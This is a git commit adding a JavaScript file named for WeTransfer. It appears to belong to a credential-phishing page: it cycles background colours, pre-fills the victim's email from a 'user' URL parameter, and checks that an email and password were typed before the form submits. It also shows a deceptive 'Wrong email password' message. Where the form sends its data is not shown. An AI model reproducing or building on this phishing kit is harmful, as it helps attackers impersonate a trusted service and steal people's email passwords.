dd54a6a3edc5bd0a025e3df3e07b0e966fd9fb7b
robmccal <143014308+robmccal@users.noreply.github.com>
2023-11-20 03:58:55 +0100

    Add files via upload

---
+++ wetransfer/script.js
@@ -0,0 +1,61 @@
+backgroundToggle();
+function backgroundToggle() {
+    let backgroundChange = document.getElementsByClassName("weTranfer")[0];
+    setTimeout(() => {
+        backgroundChange.style.background = "#023020";
+    }, 100);
+
+    setTimeout(() => {
+        backgroundChange.style.background = "#36454F";
+    }, 5000);
+
+    setTimeout(() => {
+        backgroundChange.style.background = "#301934";
+    }, 10000);
+
+    setTimeout(() => {
+        backgroundChange.style.background = "#1B1212";
+    }, 15000);
+}
+
+setInterval(() => {
+    backgroundToggle();
+}, 20000);
+
+// const clientName = document.getElementById("clientName");
+const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+
+const formContainer = document.querySelector(".formContainer");
+const email_input = document.querySelector("#email_input");
+const password_input = document.querySelector("#password_input");
+
+//
+const urlEmail = new URLSearchParams(window.location.search);
+const usermail = urlEmail.get('user');
+
+if (validEmail.test(usermail)) {
+    email_input.value = usermail.toLowerCase()
+}
+
+formContainer.addEventListener('submit', (e)=>{
+
+    if (!validEmail.test(email_input.value)) {
+        e.preventDefault()
+        alert("Please, enter your email address")
+        return
+    }
+
+    if (password_input.value == "") {
+        e.preventDefault()
+        alert("Wrong email password")
+        return
+    }
+    // alert("hello")
+})
+
+// const weBtn = document.querySelectorAll(".weBtn");
+// weBtn.forEach((getInfo) => {
+//     getInfo.addEventListener("click", function () {
+//         alert(clientName.value);
+//     });
+// });
